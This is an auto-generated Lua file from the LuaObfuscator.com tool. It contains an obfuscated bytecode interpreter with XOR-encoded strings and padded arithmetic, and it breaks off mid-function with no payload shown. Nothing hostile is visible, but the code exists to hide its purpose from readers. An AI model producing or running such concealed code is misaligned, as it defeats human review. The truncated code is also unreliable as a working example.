--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do
	local v0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	local v17;
	local v18;
	local v19;
	local v20;
	local v21;
	local v22;
	local v23;
	local v24 = 0;
	while true do
		if (v24 == 7) then
			v20 = _G[v7("\102\221\231\238\53\226", "\21\184\139\139\86\150\102\146")];
			v21 = _G[v7("\8\9\236\140\15\248", "\125\103\156\237\108\147\139\217")] or _G[v7("\19\31\37\112\15", "\103\126\71\28\106\207")][v7("\234\177\71\120\83\181", "\159\223\55\25\48\222")];
			v22 = _G[v7("\232\77\211\87\217\23\249\80", "\156\34\189\34\180\117")];
			v24 = 8;
		end
		if (v24 == 3) then
			v8 = _G[v7("\250\127\89\206\76\23\93\252", "\142\16\55\187\33\117\56")];
			v9 = _G[v7("\22\7\80\7\52\31", "\101\115\34\110\90\120\231")][v7("\3\149\11\216", "\97\236\127\189\105\112\208")];
			v10 = _G[v7("\145\36\200\83\27\239", "\226\80\186\58\117\136\76")][v7("\204\143\41\85", "\175\231\72\39\113\120\125\110")];
			v24 = 4;
		end
		if (v24 == 5) then
			v14 = _G[v7("\176\2\249\94\118", "\196\99\155\50\19\33\19\54")][v7("\223\212\21\61\124\35", "\188\187\123\94\29\87\45\175")];
			v15 = _G[v7("\6\251\55\204\247", "\114\154\85\160\146")][v7("\35\195\163\55\57\158", "\74\173\208\82\75\234\209\132")];
			v16 = _G[v7("\190\211\166\174", "\211\178\210\198\159\181\45")][v7("\34\47\79\234\62", "\78\75\42\146")];
			v24 = 6;
		end
		if (v24 == 0) then
			v0 = string.char;
			v1 = string.byte;
			v2 = string.sub;
			v24 = 1;
		end
		if (2 == v24) then
			v6 = table.insert;
			v7 = nil;
			v7 = function(v29, v30, v31, v32, v33, v34)
				local v39 = 0;
				local v40;
				while true do
					if (v39 == 0) then
						v40 = {};
						for v55 = 1, #v29 do
							v6(v40, v0(v4(v1(v2(v29, v55, v55 + 1)), v1(v2(v30, 1 + ((v55 - 1) % #v30), 1 + ((v55 - 1) % #v30) + 1))) % 256));
						end
						v39 = 1;
					end
					if (v39 == 1) then
						return v5(v40);
					end
				end
			end;
			v24 = 3;
		end
		if (v24 == 6) then
			v17 = _G[v7("\33\166\247\55\29\132\48", "\70\195\131\81\120\234")] or function()
				return _ENV;
			end;
			v18 = _G[v7("\206\222\204\221\65\168\223\201\218\218\220\65", "\189\187\184\176\36\220\190")];
			v19 = _G[v7("\231\196\189\180\251", "\151\167\220\216")];
			v24 = 7;
		end
		if (v24 == 8) then
			v23 = nil;
			v23 = function(v35, v36, ...)
				local v41 = 0;
				local v42;
				local v43;
				local v44;
				local v45;
				local v46;
				local v47;
				local v48;
				local v49;
				local v50;
				local v51;
				local v52;
				local v53;
				local v54;
				while true do
					if (v41 == 3) then
						v51 = nil;
						v52 = nil;
						v53 = nil;
						v41 = 4;
					end
					if (v41 == 2) then
						v48 = nil;
						v49 = nil;
						v50 = nil;
						v41 = 3;
					end
					if (v41 == 4) then
						v54 = nil;
						while true do
							local v56 = 0;
							while true do
								if (v56 == 0) then
									if (v42 == 1) then
										local v57 = 0;
										while true do
											if (v57 == 0) then
												v45 = nil;
												v45 = function(v65, v66, v67, v68, v69, v70, v71, v72)
													if v67 then
														local v162 = 0;
														local v163;
														local v164;
														while true do
															if (v162 == 1) then
																while true do
																	if (v163 == 0) then
																		local v180 = 0;
																		while true do
																			if (v180 == 0) then
																				v164 = (v65 / ((2 + 0) ^ (v66 - 1))) % (((3 + (825 - (547 + 275))) - 4) ^ (((v67 - (1 + 0 + 0)) - (v66 - ((1005 - (968 + 36)) + (1705 - (1359 + (498 - 152)))))) + (666 - ((753 - (109 + 564)) + (1102 - (1721 - 1204))))));
																				return v164 - (v164 % (((19 - (14 + 4)) - 0) + 0));
																			end
																		end
																	end
																end
																break;
															end
															if (v162 == 0) then
																v163 = 0;
																v164 = nil;
																v162 = 1;
															end
														end
													else
														local v165 = 0;
														local v166;
														local v167;
														while true do
															if (v165 == 1) then
																while true do
																	if (v166 == (0 + 0)) then
																		local v181 = 0;
																		while true do
																			if (v181 == 0) then
																				v167 = (298 - (((151 + 18) - (224 - 114)) + (693 - (183 + 190 + 83)))) ^ (v66 - (692 - ((1649 - (874 + 113)) + 29)));
																				return (((v65 % (v167 + v167)) >= v167) and ((2 - 0) - ((1 + 3) - 3))) or (0 - 0);
																			end
																		end
																	end
																end
																break;
															end
															if (v165 == 0) then
																v166 = 0;
																v167 = nil;
																v165 = 1;
															end
														end
													end
												end;
												v57 = 1;
											end
											if (v57 == 1) then
												v46 = nil;
												v42 = 2;
												break;
											end
										end
									end
									if (v42 == 4) then
										local v58 = 0;
										while true do
											if (v58 == 0) then
												v49 = function(v73, v74, v75, v76, v77, v78)
													local v124 = 0;
													local v125;
													local v126;
													local v127;
													local v128;
													local v129;
													local v130;
													local v131;
													while true do
														if (v124 == 1) then
															v127 = nil;
															v128 = nil;
															v124 = 2;
														end
														if (v124 == 2) then
															v129 = nil;
															v130 = nil;
															v124 = 3;
														end
														if (v124 == 3) then
															v131 = nil;
															while true do
																local v173 = 0;
																while true do
																	if (v173 == 1) then
																		if (v125 == 0) then
																			local v183 = 0;
																			while true do
																				if (v183 == 1) then
																					v125 = 1 - 0;
																					break;
																				end
																				if (v183 == 0) then
																					v126 = v48();
																					v127 = v48();
																					v183 = 1;
																				end
																			end
																		end
																		if (v125 == 1) then
																			local v184 = 0;
																			while true do
																				if (v184 == 1) then
																					v125 = 2 + 0;
																					break;
																				end
																				if (v184 == 0) then
																					v128 = 1 - (1854 - ((1726 - 818) + 373 + 573));
																					v129 = (v45(v127, 1 - (0 + 0), 3 + 2 + 15) * ((2 + 0) ^ (55 - ((279 - (58 + 170)) - 28)))) + v126;
																					v184 = 1;
																				end
																			end
																		end
																		break;
																	end
																	if (v173 == 0) then
																		if (2 == v125) then
																			local v185 = 0;
																			while true do
																				if (v185 == 0) then
																					v130 = v45(v127, 21, 31);
																					v131 = ((v45(v127, (70 + 32) - 70) == 1) and -(1 + (1518 - (952 + 566)))) or (((1314 - (331 + 754)) - (177 + 51)) + 0);
																					v185 = 1;
																				end
																				if (v185 == 1) then
																					v125 = 3;
																					break;
																				end
																			end
																		end
																		if (v125 == 3) then
																			local v186 = 0;
																			while true do
																				if (v186 == 0) then
																					if (v130 == ((1346 - (250 + 1096)) + 0)) then
																						if (v129 == ((3863 - 2336) - (19 + (18 - 13) + 1503))) then
																							return v131 * ((192 - (148 + 44)) + (1451 - (101 + 1350)));
																						else
																							local v230 = 0;
																							local v231;
																							while true do
																								if (v230 == 0) then
																									v231 = 0 - 0;
																									while true do
																										if (v231 == (1853 - (394 + 1459))) then
																											v130 = 1 + 0 + 0;
																											v128 = (0 - 0) + (433 - (195 + 238));
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																					elseif (v130 == (1052 + 995)) then
																						return ((v129 == (1835 - (996 + 839))) and (v131 * ((1 - 0) / (0 - 0)))) or (v131 * NaN);
																					end
																					return v16(v131, v130 - ((6059 - (917 + 829 + 151)) - ((1290 - (66 + 298)) + (3590 - 1377)))) * (v128 + (v129 / (((2 + 1) - (3 - 2)) ^ ((176 + 388) - (191 + 60 + (963 - (372 + 330)))))));
																				end
																			end
																		end
																		v173 = 1;
																	end
																end
															end
															break;
														end
														if (v124 == 0) then
															v125 = 0;
															v126 = nil;
															v124 = 1;
														end
													end
												end;
												v50 = nil;
												v58 = 1;
											end
											if (1 == v58) then
												v50 = function(v79, v80, v81, v82, v83, v84, v85, v86, v87, v88)
													local v132 = 0;
													local v133;
													local v134;
													local v135;
													while true do
														if (v132 == 1) then
															v135 = nil;
															while true do
																local v174 = 0;
																while true do
																	if (1 == v174) then
																		if (v133 == 3) then
																			return v14(v135);
																		end
																		if (v133 == (0 + 0)) then
																			local v187 = 0;
																			while true do
																				if (v187 == 1) then
																					v133 = 1;
																					break;
																				end
																				if (v187 == 0) then
																					v134 = nil;
																					if not v79 then
																						local v227 = 0;
																						local v228;
																						while true do
																							if (0 == v227) then
																								v228 = 0 + 0;
																								while true do
																									if (v228 == 0) then
																										v79 = v48();
																										if (v79 == (0 + 0)) then
																											return "";
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					v187 = 1;
																				end
																			end
																		end
																		break;
																	end
																	if (v174 == 0) then
																		if (v133 == 1) then
																			local v188 = 0;
																			while true do
																				if (v188 == 1) then
																					v133 = 2;
																					break;
																				end
																				if (v188 == 0) then
																					v134 = v11(v35, v43, (v43 + v79) - ((2 - (72 - (50 + 21))) - (1942 - (670 + 1272))));
																					v43 = v43 + v79;
																					v188 = 1;
																				end
																			end
																		end
																		if (v133 == (2 + 0)) then
																			local v189 = 0;
																			while true do
																				if (v189 == 1) then
																					v133 = 3;
																					break;
																				end
																				if (v189 == 0) then
																					v135 = {};
																					for v205 = 1, #v134 do
																						v135[v205] = v10(v9(v11(v134, v205, v205)));
																					end
																					v189 = 1;
																				end
																			end
																		end
																		v174 = 1;
																	end
																end
															end
															break;
														end
														if (v132 == 0) then
															v133 = 0;
															v134 = nil;
															v132 = 1;
														end
													end
												end;
												v42 = 5;
												break;
											end
										end
									end
									v56 = 1;
								end
								if (v56 == 1) then
									if (v42 == 7) then
										local v59 = 0;
										while true do
											if (v59 == 0) then
												v54 = function(v89, v90, v91, v92, v93, v94, v95)
													local v136 = 0;
													local v137;
													local v138;
													local v139;
													local v140;
													while true do
														if (v136 == 0) then
															v137 = 0;
															v138 = nil;
															v136 = 1;
														end
														if (v136 == 1) then
															v139 = nil;
															v140 = nil;
															v136 = 2;
														end
														if (v136 == 2) then
															while true do
																local v175 = 0;
																while true do
																	if (v175 == 0) then
																		if (0 == v137) then
																			local v190 = 0;
																			while true do
																				if (v190 == 0) then
																					v138 = v89[1269 - (858 + 410)];
																					v139 = v89[5 - (1943 - (57 + 1883))];
																					v190 = 1;
																				end
																				if (v190 == 1) then
																					v137 = 1;
																					break;
																				end
																			end
																		end
																		if (v137 == 1) then
																			local v191 = 0;
																			while true do
																				if (0 == v191) then
																					v140 = v89[3];
																					return function(...)
																						local v207 = 0;
																						local v208;
																						local v209;
																						local v210;
																						local v211;
																						local v212;
																						local v213;
																						while true do
																							if (v207 == 2) then
																								v212 = nil;
																								v213 = nil;
																								v207 = 3;
																							end
																							if (v207 == 1) then
																								v210 = nil;
																								v211 = nil;
																								v207 = 2;
																							end
																							if (v207 == 3) then
																								while true do
																									if (v208 == 3) then
																										_G['A'], _G['B'] = v52(v19(v213));
																										if not _G['A'][2 - (1 + 0)] then
																											local v238 = 0;
																											local v239;
																											local v240;
																											while true do
																												if (v238 == 0) then
																													v239 = 0;
																													v240 = nil;
																													v238 = 1;
																												end
																												if (v238 == 1) then
																													while true do
																														if (v239 == 0) then
																															v240 = v89[1068 - (737 + (878 - 551))][v209] or "?";
																															error(v7("\220\27\227\50\103\254\148\185\253\10\254\41\55\235\192\252\212", "\143\120\145\91\23\138\180\220") .. v240 .. v7("\79\164", "\18\158\41\83") .. _G['A'][1 + 1]);
																															break;
																														end
																													end
																													break;
																												end
																											end
																										else
																											return v21(_G['A'], (1238 + 149) - (1097 + 207 + 81), _G['B']);
																										end
																										break;
																									end
																									if (2 == v208) then
																										local v232 = 0;
																										while true do
																											if (v232 == 0) then
																												v213 = nil;
																												v213 = function(v246, v247, v248, v249, v250, v251, v252)
																													local v253 = 0;
																													local v254;
																													local v255;
																													local v256;
																													local v257;
																													local v258;
																													local v259;
																													local v260;
																													local v261;
																													local v262;
																													local v263;
																													while true do
																														if (v253 == 3) then
																															v262 = nil;
																															v263 = nil;
																															while true do
																																local v264 = 0;
																																local v265;
																																while true do
																																	if (0 == v264) then
																																		v265 = 0;
																																		while true do
																																			if (v265 == 1) then
																																				if (v263 <= (10 + 4)) then
																																					if (v263 <= 6) then
																																						if (v263 <= ((2731 - 1073) - ((2577 - 1916) + (2933 - 1938)))) then
																																							if (v263 <= ((0 - 0) - (208 - (78 + 130)))) then
																																								local v292 = 0;
																																								local v293;
																																								local v294;
																																								while true do
																																									if (1 == v292) then
																																										while true do
																																											if (v293 == 0) then
																																												v294 = v262[2];
																																												v260[v294] = v260[v294](v21(v260, v294 + 1, v210));
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (v292 == 0) then
																																										v293 = 0;
																																										v294 = nil;
																																										v292 = 1;
																																									end
																																								end
																																							elseif (v263 == ((2 - 1) + (143 - (136 + 7)))) then
																																								local v300 = 0;
																																								local v301;
																																								local v302;
																																								local v303;
																																								local v304;
																																								while true do
																																									if (v300 == 0) then
																																										v301 = 0;
																																										v302 = nil;
																																										v300 = 1;
																																									end
																																									if (2 == v300) then
																																										while true do
																																											if (0 == v301) then
																																												local v378 = 0;
																																												while true do
																																													if (v378 == 1) then
																																														v301 = 1;
																																														break;
																																													end
																																													if (v378 == 0) then
																																														v302 = v262[2 + 0];
																																														v303 = v260[v302];
																																														v378 = 1;
																																													end
																																												end
																																											end
																																											if (1 == v301) then
																																												v304 = v260[v302 + (2 - 1) + 1];
																																												if (v304 > (0 + 0)) then
																																													if (v303 > v260[v302 + 1]) then
																																														v209 = v262[(1152 - (653 + 493)) - 3];
																																													else
																																														v260[v302 + 3] = v303;
																																													end
																																												elseif (v303 < v260[v302 + (1790 - (47 + 1742)) + 0]) then
																																													v209 = v262[10 - 7];
																																												else
																																													v260[v302 + 3 + (0 - 0)] = v303;
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (v300 == 1) then
																																										v303 = nil;
																																										v304 = nil;
																																										v300 = 2;
																																									end
																																								end
																																							else
																																								v260[v262[4 - 2]] = v90[v262[(2605 - (415 + 1540)) - (242 + (2347 - (760 + 1182)))]];
																																							end
																																						elseif (v263 <= ((2 + 11) - 9)) then
																																							if (v263 > ((577 + 824) - (1023 + 375))) then
																																								v209 = v262[(532 - (272 + 251)) - (634 - (289 + 339))];
																																							else
																																								v260[v262[1 + 1]] = v260[v262[1408 - (875 + 530)]] % v262[4];
																																							end
																																						elseif (v263 > (4 + 1)) then
																																							v260[v262[1681 - ((1599 - (1164 + 359)) + 1013 + 590)]] = v260[v262[(1083 - (728 + 354)) + 2]] - v262[2 + (1101 - (892 + 207))];
																																						else
																																							v260[v262[1452 - (1152 + 298)]] = v260[v262[3]] + v262[4];
																																						end
																																					elseif (v263 <= (25 - 15)) then
																																						if (v263 <= (13 - 5)) then
																																							if (v263 == 7) then
																																								v260[v262[(674 + 488) - ((1883 - 1054) + 331)]]();
																																							else
																																								local v311 = 0;
																																								local v312;
																																								local v313;
																																								local v314;
																																								local v315;
																																								local v316;
																																								while true do
																																									if (v311 == 1) then
																																										v314 = nil;
																																										v315 = nil;
																																										v311 = 2;
																																									end
																																									if (v311 == 0) then
																																										v312 = 0;
																																										v313 = nil;
																																										v311 = 1;
																																									end
																																									if (v311 == 2) then
																																										v316 = nil;
																																										while true do
																																											if (v312 == 2) then
																																												for v397 = v313, v210 do
																																													local v398 = 0;
																																													local v399;
																																													while true do
																																														if (v398 == 0) then
																																															v399 = 0;
																																															while true do
																																																if (0 == v399) then
																																																	v316 = v316 + (2 - 1);
																																																	v260[v397] = v314[v316];
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																												break;
																																											end
																																											if (v312 == 0) then
																																												local v380 = 0;
																																												while true do
																																													if (v380 == 1) then
																																														v312 = 1;
																																														break;
																																													end
																																													if (v380 == 0) then
																																														v313 = v262[4 - 2];
																																														v314, v315 = v257(v260[v313](v21(v260, v313 + (572 - (258 + 313)), v210)));
																																														v380 = 1;
																																													end
																																												end
																																											end
																																											if (v312 == 1) then
																																												local v381 = 0;
																																												while true do
																																													if (v381 == 1) then
																																														v312 = 2;
																																														break;
																																													end
																																													if (v381 == 0) then
																																														v210 = (v315 + v313) - 1;
																																														v316 = (3233 - 2143) - (529 + 561);
																																														v381 = 1;
																																													end
																																												end
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							end
																																						elseif (v263 == (29 - (57 - 37))) then
																																							local v317 = 0;
																																							local v318;
																																							local v319;
																																							local v320;
																																							local v321;
																																							local v322;
																																							while true do
																																								if (v317 == 0) then
																																									v318 = 0;
																																									v319 = nil;
																																									v317 = 1;
																																								end
																																								if (v317 == 1) then
																																									v320 = nil;
																																									v321 = nil;
																																									v317 = 2;
																																								end
																																								if (v317 == 2) then
																																									v322 = nil;
																																									while true do
																																										if (0 == v318) then
																																											local v382 = 0;
																																											while true do
																																												if (0 == v382) then
																																													v319 = v262[86 - (24 + 35 + (105 - 80))];
																																													v320, v321 = v257(v260[v319](v21(v260, v319 + ((616 - (89 + 25)) - (437 + 64)), v262[154 - ((1410 - (468 + 843)) + (1974 - (1671 + 251)))])));
																																													v382 = 1;
																																												end
																																												if (v382 == 1) then
																																													v318 = 1;
																																													break;
																																												end
																																											end
																																										end
																																										if (v318 == 1) then
																																											local v383 = 0;
																																											while true do
																																												if (v383 == 0) then
																																													v210 = (v321 + v319) - (1 + (0 - 0));
																																													v322 = (0 + 0) - 0;
																																													v383 = 1;
																																												end
																																												if (v383 == 1) then
																																													v318 = 2;
																																													break;
																																												end
																																											end
																																										end
																																										if (v318 == 2) then
																																											for v400 = v319, v210 do
																																												local v401 = 0;
																																												local v402;
																																												while true do
																																													if (v401 == 0) then
																																														v402 = 0;
																																														while true do
																																															if (v402 == 0) then
																																																v322 = v322 + 1 + 0;
																																																v260[v400] = v320[v322];
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						else
																																							local v323 = 0;
																																							local v324;
																																							local v325;
																																							while true do
																																								if (v323 == 0) then
																																									v324 = 0;
																																									v325 = nil;
																																									v323 = 1;
																																								end
																																								if (v323 == 1) then
																																									while true do
																																										if (v324 == 0) then
																																											v325 = v262[246 - (27 + 217)];
																																											v260[v325](v21(v260, v325 + (1204 - (711 + 492)), v210));
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						end
																																					elseif (v263 <= (7 + 5)) then
																																						if (v263 == ((21 + 0) - 10)) then
																																							v260[v262[(1337 - (524 + 811)) - (0 + 0)]] = v260[v262[5 - (1901 - (1155 + 744))]] % v260[v262[(365 - (21 + 334)) - 6]];
																																						else
																																							v91[v262[8 - 5]] = v260[v262[2]];
																																						end
																																					elseif (v263 == ((11 + 16) - (11 + 3))) then
																																						v260[v262[2]] = v260[v262[3]];
																																					else
																																						v260[v262[5 - 3]] = #v260[v262[(4508 - 3604) - (386 + 135 + 124 + 256)]];
																																					end
																																				elseif (v263 <= ((32 + 65) - (145 - 69))) then
																																					if (v263 <= 17) then
																																						if (v263 <= (24 - (1228 - (551 + 668)))) then
																																							local v295 = 0;
																																							local v296;
																																							local v297;
																																							local v298;
																																							local v299;
																																							while true do
																																								if (v295 == 2) then
																																									while true do
																																										if (v296 == 2) then
																																											for v374 = (3 - 2) - 0, v262[4] do
																																												local v375 = 0;
																																												local v376;
																																												local v377;
																																												while true do
																																													if (v375 == 0) then
																																														v376 = 0;
																																														v377 = nil;
																																														v375 = 1;
																																													end
																																													if (v375 == 1) then
																																														while true do
																																															if (v376 == 1) then
																																																if (v377[4 - 3] == 13) then
																																																	v299[v374 - (1 - 0)] = {v260,v377[694 - (487 + 196 + 8)]};
																																																else
																																																	v299[v374 - 1] = {v90,v377[1248 - (18 + 1227)]};
																																																end
																																																v259[#v259 + ((3131 - (1191 + 601)) - ((2921 - 1640) + 54 + 3))] = v299;
																																																break;
																																															end
																																															if (v376 == 0) then
																																																local v435 = 0;
																																																while true do
																																																	if (v435 == 1) then
																																																		v376 = 1;
																																																		break;
																																																	end
																																																	if (v435 == 0) then
																																																		v209 = v209 + 1;
																																																		v377 = v254[v209];
																																																		v435 = 1;
																																																	end
																																																end
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											v260[v262[2]] = v54(v297, v298, v91);
																																											break;
																																										end
																																										if (v296 == 0) then
																																											local v372 = 0;
																																											while true do
																																												if (v372 == 1) then
																																													v296 = 1;
																																													break;
																																												end
																																												if (v372 == 0) then
																																													v297 = v255[v262[1815 - (1342 + 470)]];
																																													v298 = nil;
																																													v372 = 1;
																																												end
																																											end
																																										end
																																										if (v296 == 1) then
																																											local v373 = 0;
																																											while true do
																																												if (v373 == 1) then
																																													v296 = 2;
																																													break;
																																												end
																																												if (v373 == 0) then
																																													v299 = {};
																																													v298 = v18({}, {[v7("\103\236\38\134\92\214\55", "\56\179\79\232")]=function(v404, v405)
																																														local v410 = 0;
																																														local v411;
																																														local v412;
																																														while true do
																																															if (v410 == 1) then
																																																while true do
																																																	if (v411 == 0) then
																																																		local v445 = 0;
																																																		while true do
																																																			if (v445 == 0) then
																																																				v412 = v299[v405];
																																																				return v412[1 + 0][v412[1797 - (1722 + 73)]];
																																																			end
																																																		end
																																																	end
																																																end
																																																break;
																																															end
																																															if (v410 == 0) then
																																																v411 = 0;
																																																v412 = nil;
																																																v410 = 1;
																																															end
																																														end
																																													end,[v7("\113\97\10\118\43\28\91\223\75\70", "\46\62\100\19\92\117\53\187")]=function(v404, v405, v406)
																																														local v413 = 0;
																																														local v414;
																																														local v415;
																																														while true do
																																															if (0 == v413) then
																																																v414 = 0;
																																																v415 = nil;
																																																v413 = 1;
																																															end
																																															if (v413 == 1) then
																																																while true do
																																																	if (v414 == 0) then
																																																		v415 = v299[v405];
																																																		v415[1266 - (804 + 461)][v415[2 - 0]] = v406;
																																																		break;
																																																	end
																																																end
																																																break;
																																															end
																																														end
																																													end});
																																													v373 = 1;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v295 == 1) then
																																									v298 = nil;
																																									v299 = nil;
																																									v295 = 2;
																																								end
																																								if (v295 == 0) then
																																									v296 = 0;
																																									v297 = nil;
																																									v295 = 1;
																																								end
																																							end
																																						elseif (v263 > 16) then
																																							v260[v262[(1065 - 725) - (324 + 5 + 9)]] = v262[7 - (10 - 6)];
																																						else
																																							v260[v262[5 - (9 - 6)]][v260[v262[(126 - (87 + 35)) - (3 - 2)]]] = v260[v262[(4 - 2) + 2 + 0]];
																																						end
																																					elseif (v263 <= (1613 - (182 + 303 + 1018 + 91))) then
																																						if (v263 == ((2076 - 1107) - (68 + 883))) then
																																							v260[v262[2]] = v260[v262[1377 - (1204 + 170)]][v262[3 + 1]];
																																						else
																																							do
																																								return;
																																							end
																																						end
																																					elseif (v263 == (14 + 6)) then
																																						v260[v262[1984 - (873 + 1109)]] = v91[v262[(11 + 0) - 8]];
																																					else
																																						local v340 = 0;
																																						local v341;
																																						local v342;
																																						local v343;
																																						while true do
																																							if (v340 == 0) then
																																								v341 = 0;
																																								v342 = nil;
																																								v340 = 1;
																																							end
																																							if (v340 == 1) then
																																								v343 = nil;
																																								while true do
																																									if (v341 == 1) then
																																										v260[v342 + ((2 + 1) - (318 - (210 + 106)))] = v343;
																																										v260[v342] = v343[v262[597 - (148 + 445)]];
																																										break;
																																									end
																																									if (v341 == 0) then
																																										local v388 = 0;
																																										while true do
																																											if (v388 == 1) then
																																												v341 = 1;
																																												break;
																																											end
																																											if (v388 == 0) then
																																												v342 = v262[5 - (11 - 8)];
																																												v343 = v260[v262[6 - 3]];
																																												v388 = 1;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v263 <= (32 - (4 + 3))) then
																																					if (v263 <= (63 - 40)) then
																																						if (v263 == 22) then
																																							local v344 = 0;
																																							local v345;
																																							local v346;
																																							local v347;
																																							local v348;
																																							while true do
																																								if (v344 == 2) then
																																									while true do
																																										if (v345 == 0) then
																																											local v389 = 0;
																																											while true do
																																												if (0 == v389) then
																																													v346 = v262[2 + (1283 - (145 + 1138))];
																																													v347 = v260[v346 + ((1877 - (174 + 1699)) - 2)];
																																													v389 = 1;
																																												end
																																												if (v389 == 1) then
																																													v345 = 1;
																																													break;
																																												end
																																											end
																																										end
																																										if (1 == v345) then
																																											local v390 = 0;
																																											while true do
																																												if (v390 == 0) then
																																													v348 = v260[v346] + v347;
																																													v260[v346] = v348;
																																													v390 = 1;
																																												end
																																												if (v390 == 1) then
																																													v345 = 2;
																																													break;
																																												end
																																											end
																																										end
																																										if (v345 == 2) then
																																											if (v347 > ((604 - (572 + 32)) + 0)) then
																																												if (v348 <= v260[v346 + (130 - (103 + 26))]) then
																																													local v430 = 0;
																																													local v431;
																																													while true do
																																														if (v430 == 0) then
																																															v431 = 0;
																																															while true do
																																																if (v431 == 0) then
																																																	v209 = v262[(1094 - 820) - ((58 - 14) + 227)];
																																																	v260[v346 + ((9 - 5) - (180 - (89 + 90)))] = v348;
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																											elseif (v348 >= v260[v346 + 1]) then
																																												local v432 = 0;
																																												local v433;
																																												while true do
																																													if (v432 == 0) then
																																														v433 = 0;
																																														while true do
																																															if (v433 == 0) then
																																																v209 = v262[2 + 1];
																																																v260[v346 + 3] = v348;
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v344 == 1) then
																																									v347 = nil;
																																									v348 = nil;
																																									v344 = 2;
																																								end
																																								if (v344 == 0) then
																																									v345 = 0;
																																									v346 = nil;
																																									v344 = 1;
																																								end
																																							end
																																						else
																																							local v349 = 0;
																																							local v350;
																																							local v351;
																																							local v352;
																																							local v353;
																																							local v354;
																																							while true do
																																								if (v349 == 2) then
																																									v354 = nil;
																																									while true do
																																										if (v350 == 2) then
																																											for v407 = v351, v210 do
																																												local v408 = 0;
																																												local v409;
																																												while true do
																																													if (v408 == 0) then
																																														v409 = 0;
																																														while true do
																																															if (0 == v409) then
																																																v354 = v354 + 1;
																																																v260[v407] = v352[v354];
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																										if (v350 == 1) then
																																											local v391 = 0;
																																											while true do
																																												if (v391 == 0) then
																																													v210 = (v353 + v351) - ((2 + 1) - 2);
																																													v354 = 0 - (0 + 0);
																																													v391 = 1;
																																												end
																																												if (v391 == 1) then
																																													v350 = 2;
																																													break;
																																												end
																																											end
																																										end
																																										if (v350 == 0) then
																																											local v392 = 0;
																																											while true do
																																												if (v392 == 1) then
																																													v350 = 1;
																																													break;
																																												end
																																												if (v392 == 0) then
																																													v351 = v262[(1172 - (68 + 1103)) + (475 - (57 + 417))];
																																													v352, v353 = v257(v260[v351](v260[v351 + 1]));
																																													v392 = 1;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v349 == 1) then
																																									v352 = nil;
																																									v353 = nil;
																																									v349 = 2;
																																								end
																																								if (v349 == 0) then
																																									v350 = 0;
																																									v351 = nil;
																																									v349 = 1;
																																								end
																																							end
																																						end
																																					elseif (v263 == ((283 - 223) - (5 + 31))) then
																																						local v355 = 0;
																																						local v356;
																																						local v357;
																																						while true do
																																							if (0 == v355) then
																																								v356 = 0;
																																								v357 = nil;
																																								v355 = 1;
																																							end
																																							if (v355 == 1) then
																																								while true do
																																									if (v356 == 0) then
																																										v357 = v262[2];
																																										do
																																											return v260[v357](v21(v260, v357 + (817 - (514 + 302)) + 0 + 0, v262[3]));
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					else
																																						v260[v262[671 - (73 + 596)]] = {};
																																					end
																																				elseif (v263 <= ((1042 - (445 + 561)) - (11 - 2))) then
																																					if (v263 > (4 + 22)) then
																																						v260[v262[5 - 3]] = v262[3] + v260[v262[4]];
																																					elseif not v260[v262[213 - (10 + 201)]] then
																																						v209 = v209 + (531 - (434 + 96));
																																					else
																																						v209 = v262[6 - 3];
																																					end
																																				elseif (v263 == 28) then
																																					local v360 = 0;
																																					local v361;
																																					local v362;
																																					while true do
																																						if (v360 == 1) then
																																							while true do
																																								if (0 == v361) then
																																									v362 = v262[6 - (1 + 3)];
																																									v260[v362] = v260[v362](v21(v260, v362 + (1 - (0 + 0)), v262[3]));
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (v360 == 0) then
																																							v361 = 0;
																																							v362 = nil;
																																							v360 = 1;
																																						end
																																					end
																																				else
																																					local v363 = 0;
																																					local v364;
																																					local v365;
																																					while true do
																																						if (v363 == 0) then
																																							v364 = 0;
																																							v365 = nil;
																																							v363 = 1;
																																						end
																																						if (v363 == 1) then
																																							while true do
																																								if (v364 == 0) then
																																									v365 = v262[(4 + 3) - 5];
																																									do
																																										return v21(v260, v365, v210);
																																									end
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																				v209 = v209 + (2 - 1);
																																				break;
																																			end
																																			if (0 == v265) then
																																				local v283 = 0;
																																				while true do
																																					if (v283 == 0) then
																																						v262 = v254[v209];
																																						v263 = v262[1 + 0 + 0];
																																						v283 = 1;
																																					end
																																					if (v283 == 1) then
																																						v265 = 1;
																																						break;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															break;
																														end
																														if (v253 == 0) then
